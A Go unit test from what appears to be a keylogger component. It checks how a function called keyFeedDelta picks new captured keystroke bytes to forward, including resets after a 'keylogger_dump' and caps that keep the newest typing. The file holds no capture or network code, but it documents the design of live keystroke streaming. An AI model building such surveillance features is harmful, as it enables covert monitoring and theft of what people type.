package main

import (
	"strings"
	"testing"
)

// TestKeyFeedDelta pins the cursor rules: only new bytes are sent, a buffer
// reset (keylogger_dump) starts over, and a burst keeps the NEWEST bytes
// because stale keystrokes are less useful than what is being typed now.
func TestKeyFeedDelta(t *testing.T) {
	buf := []byte("hello")

	chunk, next := keyFeedDelta(buf, 0, maxKeyFeedDelta)
	if string(chunk) != "hello" || next != 5 {
		t.Fatalf("initial delta = %q next=%d", chunk, next)
	}
	chunk, next = keyFeedDelta(buf, next, maxKeyFeedDelta)
	if len(chunk) != 0 || next != 5 {
		t.Fatalf("idle delta = %q next=%d, want empty", chunk, next)
	}

	buf = []byte("hello world")
	chunk, next = keyFeedDelta(buf, 5, maxKeyFeedDelta)
	if string(chunk) != " world" || next != 11 {
		t.Fatalf("incremental delta = %q next=%d", chunk, next)
	}

	// A dump reset the buffer: the cursor must not point past the end.
	chunk, next = keyFeedDelta([]byte("new"), 11, maxKeyFeedDelta)
	if string(chunk) != "new" || next != 3 {
		t.Fatalf("reset delta = %q next=%d", chunk, next)
	}

	// A burst larger than the cap keeps the tail.
	burst := []byte(strings.Repeat("a", 100) + "TAIL")
	chunk, next = keyFeedDelta(burst, 0, 8)
	if string(chunk) != string(burst[len(burst)-8:]) || next != len(burst) {
		t.Fatalf("burst delta = %q next=%d", chunk, next)
	}
	if !strings.HasSuffix(string(chunk), "TAIL") {
		t.Fatalf("burst delta lost the newest bytes: %q", chunk)
	}
}
